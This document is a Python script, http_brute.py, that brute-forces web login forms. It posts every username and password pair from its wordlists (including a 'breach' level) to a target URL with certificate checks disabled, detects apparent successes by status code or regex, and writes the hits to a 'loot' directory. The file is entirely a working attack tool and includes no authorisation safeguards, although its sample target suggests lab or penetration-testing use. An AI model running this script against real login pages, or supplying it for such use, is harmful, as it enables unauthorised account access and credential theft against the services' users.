#!/usr/bin/env python3
# http_brute.py — Brute-force login endpoint using usernames and passwords
# Author: Braxton Bailey (@Jimi421)

import argparse, os, sys, json, requests, time, re
from datetime import datetime

requests.packages.urllib3.disable_warnings()

def load_list(path):
    if not os.path.exists(path):
        print(f"[!] Wordlist not found: {path}")
        sys.exit(1)
    with open(path) as f:
        return list(set(line.strip() for line in f if line.strip()))

def get_wordlist_paths(level=None, userdb=None, passdb=None):
    levels = {
        "fast":   ("wordlists/usernames.txt", "wordlists/passwords-top500.txt"),
        "full":   ("wordlists/usernames.txt", "wordlists/passwords.txt"),
        "breach": ("wordlists/usernames.txt", "wordlists/passwords-big.txt")
    }
    if level:
        return levels.get(level, levels["full"])
    return userdb or levels["full"][0], passdb or levels["full"][1]

def send_request(url, user, pwd, args):
    headers = {
        "User-Agent": args.ua or "Mozilla/5.0",
        "Content-Type": "application/json" if args.json else "application/x-www-form-urlencoded"
    }
    if args.header:
        k, v = args.header.split(":", 1)
        headers[k.strip()] = v.strip()

    data = {"username": user, "password": pwd}
    try:
        if args.json:
            r = requests.post(url, json=data, headers=headers, timeout=args.timeout, verify=False)
        else:
            r = requests.post(url, data=data, headers=headers, timeout=args.timeout, verify=False)

        return r
    except Exception as e:
        if args.verbose:
            print(f"[!] Error for {user}:{pwd} → {e}")
        return None

def is_valid_response(response, args):
    if response is None:
        return False
    if args.success_regex and re.search(args.success_regex, response.text, re.I):
        return True
    if response.status_code == 200 and "Invalid" not in response.text:
        return True
    if response.status_code == 302:
        return True
    return False

def brute_force(target, usernames, passwords, args):
    results = []
    print(f"[+] Brute-forcing {target} ({len(usernames)} users × {len(passwords)} passwords)")
    for user in usernames:
        for pwd in passwords:
            r = send_request(target, user, pwd, args)
            if is_valid_response(r, args):
                print(f"\033[92m[!!] POSSIBLE VALID → {user}:{pwd}\033[0m")
                results.append({"username": user, "password": pwd})
            elif args.verbose:
                print(f"\033[90m[-] {user}:{pwd} failed\033[0m")

            if args.delay:
                time.sleep(args.delay)

    return results

def save_results(results, target):
    if not results:
        return
    os.makedirs("loot", exist_ok=True)
    ts = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
    slug = target.replace("http://", "").replace("https://", "").replace(":", "_").replace("/", "")
    out = f"loot/http-brute-{slug}-{ts}.json"
    with open(out, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Results saved to: {out}")

def main():
    parser = argparse.ArgumentParser(description="HTTP brute-force login attack")
    parser.add_argument("--target", required=True, help="Login URL (e.g., http://10.10.10.42/login)")
    parser.add_argument("--level", choices=["fast", "full", "breach"], help="Wordlist level")
    parser.add_argument("--userdb", help="Custom username list")
    parser.add_argument("--passdb", help="Custom password list")
    parser.add_argument("--delay", type=float, default=0, help="Delay between requests (sec)")
    parser.add_argument("--timeout", type=float, default=4, help="Request timeout")
    parser.add_argument("--header", help="Extra header (key:value)")
    parser.add_argument("--ua", help="User-Agent string")
    parser.add_argument("--json", action="store_true", help="Use JSON payload")
    parser.add_argument("--success-regex", help="Regex for success response (e.g. 'Welcome')")
    parser.add_argument("--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    user_path, pass_path = get_wordlist_paths(args.level, args.userdb, args.passdb)
    usernames = load_list(user_path)
    passwords = load_list(pass_path)

    hits = brute_force(args.target, usernames, passwords, args)
    save_results(hits, args.target)

if __name__ == "__main__":
    main()

